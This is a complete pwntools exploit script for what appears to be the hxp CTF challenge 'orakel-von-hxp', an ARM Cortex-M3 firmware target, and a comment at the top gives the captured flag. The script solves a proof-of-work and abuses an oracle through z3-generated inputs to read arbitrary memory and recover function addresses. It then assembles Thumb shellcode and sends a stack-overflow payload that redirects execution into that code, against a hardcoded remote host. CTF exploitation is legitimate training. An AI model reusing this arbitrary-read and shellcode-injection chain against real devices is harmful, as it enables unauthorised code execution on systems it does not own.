# hxp{at_l3as7_y0u_f0und_s7rncmp_-_r0p_sp0ns0r3d_by_n3wl1b___2739b2436edfb292}
from pwn import *
context.log_level = 'debug'
context.arch = 'arm'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './orakel-von-hxp_CM3.bin'
HOST = '0'
PORT =  1338
dopow = False

if True:
    HOST = '91.98.131.46'
    dopow = True

#elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [])


if dopow:
    r.recvuntilb(b'"')
    hash_head = r.recvuntilb(b'"', True)
    r.recvuntilb(b'with ')
    bits = r.recvuntilb(b' ', True)
    import subprocess
    cmd = ["./pow-solver", bits.decode(), hash_head.decode()]
    print(cmd)
    result = subprocess.run(
        cmd,      # 実行するバイナリ
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True              # 文字列として受け取る（Python 3.7+）
    )

    r.sendlineafter(b').\n', result.stdout.encode())

from z3s import solz
def aar(where):
    r.sendlineafter(b'possible: \n', flat(solz(where))) # we need twice on remote somehow.
    r.sendlineafter(b'possible: \n', flat(solz(where)))
    r.recvuntil(b'answered ')
    ret = int(r.recvuntil(b'.', True), 16)
    print(f'read: {where :#x} ==> {ret :#x}')
    return ret
def thumb_bl_target(instr, instr_addr):
    instr_bytes = p32(instr)
    # instr_bytes: bytes-like, length 4 (little endian)
    hw1 = instr_bytes[1] << 8 | instr_bytes[0]
    hw2 = instr_bytes[3] << 8 | instr_bytes[2]

    # 上位ハーフワード
    S = (hw1 >> 10) & 1
    imm10 = hw1 & 0x03FF

    # 下位ハーフワード
    J1 = (hw2 >> 13) & 1
    J2 = (hw2 >> 11) & 1
    imm11 = hw2 & 0x07FF

    # I1, I2 の復元
    I1 = (~(J1 ^ S)) & 1
    I2 = (~(J2 ^ S)) & 1

    # 即値組み立て
    imm32 = (
        (S << 24)
        | (I1 << 23)
        | (I2 << 22)
        | (imm10 << 12)
        | (imm11 << 1)
    )

    # 符号拡張（25bit）
    if S:
        imm32 |= 0xFE000000

    pc = instr_addr + 4
    return (pc + imm32) & 0xFFFFFFFF


endword = b'I am enlightened'
stack_bottom = aar(0)
print(f'{stack_bottom = :#x}')
sp = stack_bottom-0xf0
print(f'{sp = :#x}')

reset_vector = aar(4) - 1
print(f'{reset_vector = :#x}')
#reset_vector = 0xf0
main = thumb_bl_target(aar(reset_vector+0x44), reset_vector+0x44)
print(f'{main = :#x}')
print(f'"b*{main+0xfa:#x}"')
uart1 = aar(0x20000004)
print(f'{uart1 = :#x}')
nvic_irq_enable = thumb_bl_target(aar(main+0x12), main+0x12)
print(f'{nvic_irq_enable = :#x}')
uart_init = thumb_bl_target(aar(main+0x52), main+0x52)
print(f'{uart_init = :#x}')

context.log_level = 'debug'
pause()

# do just like uart0 did for uart1
code = f'''
    sub r13, #0x70
    mov r0, #0x16
    movw r4, #{(nvic_irq_enable+1) & 0xffff}
    movt r4, #{(nvic_irq_enable+1) >> 16}
    blx r4 

    movw r0, #{uart1 & 0xffff}
    movt r0, #{uart1 >> 16}
    movw r1, #{115200 & 0xffff}
    movt r1, #{115200 >> 16}
    movw r4, #{(uart_init+1) & 0xffff}
    movt r4, #{(uart_init+1) >> 16}
    blx r4 

    movw r3, #{uart1 & 0xffff}
    movt r3, #{uart1 >> 16}
    movw r4, #{(main+0x78+1) & 0xffff}
    movt r4, #{(main+0x78+1) >> 16}

    movw r7, #{(0x2000ff54) & 0xffff}
    movt r7, #{(0x2000ff54) >> 16}
    blx r4 
'''

# just for getting proper code
with open('./code.s', 'w') as f:
    f.write(code)
import os
os.system("make")

with open('./code.bin', 'rb') as f:
    inp = f.read()

payload = b''
payload += b'\x02'*0x20
payload += inp
payload += b'a' * (len(payload) % 4)
payload += flat(0x2000fe00) * ((0x8c-len(payload))//4)
payload += flat(0x2000ff58, 0x2000fff0, 0x2000ff79)
r.sendlineafter(b'possible: \n', payload)
r.sendlineafter(b'possible: \n', endword)


r.interactive()
r.close()

